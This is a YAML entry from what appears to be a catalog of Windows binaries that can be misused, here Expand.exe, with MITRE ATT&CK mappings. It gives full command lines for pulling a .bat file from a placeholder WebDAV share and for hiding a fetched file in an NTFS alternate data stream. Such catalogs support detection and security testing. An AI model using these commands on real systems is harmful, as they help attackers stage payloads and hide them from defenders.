---
name: Expand.exe
description: Binary that expands one or more compressed files
functions:
  download:
    - description: Copies source file to destination.
      code: expand \\webdav\folder\file.bat c:\ADS\file.bat
      mitreid: T1105
      mitrelink: https://attack.mitre.org/wiki/Technique/T1105
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Use to copies the source file to the destination file
  copy:
    - description: Copies source file to destination.
      code: expand c:\ADS\file1.bat c:\ADS\file2.bat
      mitreid: T1105
      mitrelink: https://attack.mitre.org/wiki/Technique/T1105
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Copies files from A to B
  ads:
    - description: Copies source file to destination Alternate Data Stream (ADS)
      code: expand \\webdav\folder\file.bat c:\ADS\file.txt:file.bat
      mitreid: T1096
      mitrelink: https://attack.mitre.org/wiki/Technique/T1096
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Copies files from A to B
resources:
    - resource: https://twitter.com/infosecn1nja/status/986628482858807297
    - resource: https://twitter.com/Oddvarmoe/status/986709068759949319
fullpath:
    - path: C:\Windows\System32\Expand.exe
    - path: C:\Windows\SysWOW64\Expand.exe
detection:
  - IOC: 
acknowledgement:
  - Person: Rahmat Nurfauzi
    Handle: '@infosecn1nja'
  - Person: Oddvar Moe
    Handle: '@oddvarmoe'
---
